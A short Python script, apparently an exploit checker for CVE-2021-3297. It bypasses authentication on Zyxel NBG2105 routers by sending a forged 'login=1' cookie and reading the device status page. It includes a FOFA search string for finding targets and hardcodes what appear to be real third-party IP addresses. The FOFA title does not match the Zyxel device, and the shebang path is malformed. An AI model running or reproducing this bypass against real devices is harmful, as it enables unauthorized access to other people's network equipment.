#!/bin/usr/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

def title():
    print('+    fofa:   title="流媒体管理服务器"')
    print('+    Info:   CVE-2021-3297-Zyxel NBG2105 身份验证绕过 ')
def run_proto(url):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Cookie': 'login=1',
        'Upgrade-Insecure-Requests': '1'
              }
    headers1 = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
               'Referer': 'http://147.175.56.20/login_ok.htm',
                'Cookie': 'login=1',
               'Upgrade-Insecure-Requests': '1'}
    headers2 = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Referer': 'http://147.175.56.20/home.htm',
        'Cookie': 'login=1',
        'Upgrade-Insecure-Requests': '1'}
    try:
        session = requests.session()
        session.get(url=url + '/login_ok.htm', headers=headers, timeout=3,  verify=False)
        session.get(url=url + '/home.htm', headers=headers1, timeout=3, verify=False)
        session.get(url=url + '/top.htm', headers=headers2, timeout=3, verify=False)
        session.get(url=url + '/menu.htm', headers=headers2, timeout=3, verify=False)
        session.get(url=url + '/status.htm', headers=headers2, timeout=3, verify=False)
        response = session.get(url=url + '/status.htm', headers=headers2, timeout=3, verify=False)
        test = re.search(r'[a-zA-Z0-9]{1,3}:[a-zA-Z0-9]{1,3}:[a-zA-Z0-9]{1,3}:[a-zA-Z0-9]{1,3}', response.text, re.I)
        if response.status_code == 200 and 'ZyXEL' in response.text and 'DHCP' in response.text and test:
            return True
        else:
            return False
    except Exception as e:
        return False
def run(ip, port):
    i = 0
    proto = ['http']
    while i < 1:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '147.175.56.20:80;91.154.165.79:80'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
